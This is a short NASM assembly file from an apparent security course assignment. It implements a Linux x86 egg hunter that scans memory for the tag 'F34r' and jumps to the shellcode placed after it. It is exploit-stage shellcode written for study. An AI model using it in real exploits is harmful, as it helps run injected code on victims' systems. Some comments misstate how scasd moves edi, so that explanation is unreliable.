; Filename:     egg_hunter.nasm
; Author:       Samuel Dugo
; SLAE-ID:      SLAE-1376
; Size:         35 bytes
; Purpose:      Assignment #3. This code creates an egg hunter using the tag "F34r".

global _start

section .text
_start:
        xor edx,edx             ;cleans the pointer of addresses to be inspected
pagination:
        or dx,0xfff             ;page alignment instruction
                                ;In case of invalid page, it goes directly to the next one
inc_addr:
        inc edx                 ;moves up the PAGE_SIZE value (starts at fff+1 = 0x1000)
                                ;used to go over valid addresses on every valid page

        lea ebx,[edx+0x4]       ;loads the value of edx+0x4 on ebx.
                                ;This technique helps to evaluate 8 bytes every time.
                                ;The EggHunter compares the last 4 bytes first, and if there is a
                                ;coincidence, scasd will automatically reduce edi by 4, so
                                ;the first 4 bytes will be also compared.
        push byte 0x0c
        pop eax                 ;sets syscall as sys_chdir
        int 0x80                ;executes chdir(ebx)
        cmp al,0xf2             ;checks if the function returned an EFAULT error
        jz pagination           ;if EFAULT was set, the memory address space cannot be accessed
        mov eax,0x46333472      ;else, load the egg hunter tag "F34r" on eax
        mov edi,ebx             ;loads the current memory address searched (last 4 bytes) on edi

        scasd                   ;checks if the address (last 4 bytes) matches the egg hunter tag
        jnz inc_addr            ;if not, continue on next address
        scasd                   ;else, reduce edi by 4 and check if the address (first 4 bytes)
                                ;matches the egg hunter as well
        jnz inc_addr            ;if not, continue on next 8 bytes

        jmp edi                 ;if the egg hunter is found, jumps onto
                                ;the address and execute the shellcode